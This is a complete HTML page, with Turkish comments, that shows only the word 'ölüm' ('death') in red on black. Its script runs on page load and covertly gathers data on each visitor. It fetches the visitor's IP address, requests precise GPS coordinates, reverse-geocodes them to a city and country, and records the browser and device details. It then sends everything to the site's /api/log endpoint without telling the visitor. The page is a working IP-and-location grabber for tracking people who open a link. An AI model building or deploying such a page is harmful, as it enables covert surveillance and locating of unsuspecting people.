<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: black;
            color: red;
            font-size: 50px;
            font-weight: bold;
            text-align: center;
        }
    </style>
</head>
<body>
    ölüm

    <script>
        // IP'yi almak için
        async function getUserIP() {
            try {
                const res = await fetch('https://api64.ipify.org?format=json'); 
                const data = await res.json();
                return data.ip;
            } catch (error) {
                console.error("IP alınırken hata oluştu:", error);
                return "Bilinmeyen";
            }
        }

        // Nominatim üzerinden enlem/boylam -> ülke/şehir
        async function getLocationFromCoords(latitude, longitude) {
            try {
                // zoom=18 & addressdetails=1 ile daha detaylı veriler
                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
                const data = await res.json();

                const country = data.address && data.address.country ? data.address.country : "Bilinmeyen";
                const city = data.address && (data.address.city || data.address.town || data.address.village)
                    ? (data.address.city || data.address.town || data.address.village)
                    : "Bilinmeyen";

                return { country, city };
            } catch (error) {
                console.error("GPS konum alınırken hata oluştu:", error);
                return { country: "Bilinmeyen", city: "Bilinmeyen" };
            }
        }

        // Tarayıcıdan (HTML5 Geolocation) enlem-boylam alma
        function getGPSLocation() {
            return new Promise((resolve) => {
                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            const latitude = position.coords.latitude;
                            const longitude = position.coords.longitude;
                            const location = await getLocationFromCoords(latitude, longitude);
                            resolve({ latitude, longitude, location });
                        },
                        (error) => {
                            console.error("Konum izni reddedildi veya hata oluştu:", error);
                            resolve(null);
                        },
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                } else {
                    console.error("Tarayıcı konum API'sini desteklemiyor.");
                    resolve(null);
                }
            });
        }

        // IP + Konum bilgilerini toplayıp sunucuya POST etme
        async function sendData() {
            const ip = await getUserIP();
            const locationData = await getGPSLocation();

            let userData = {
                ip: ip,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenWidth: screen.width,
                screenHeight: screen.height,
                language: navigator.language,
                location: locationData
                    ? `${locationData.location.city}, ${locationData.location.country}`
                    : "Konum alınamadı",
                latitude: locationData ? locationData.latitude : null,
                longitude: locationData ? locationData.longitude : null
            };

            fetch('/api/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(userData)
            });
        }

        // Sayfa açılınca konum isteyip sunucuya kaydet
        sendData();
    </script>
</body>
</html>
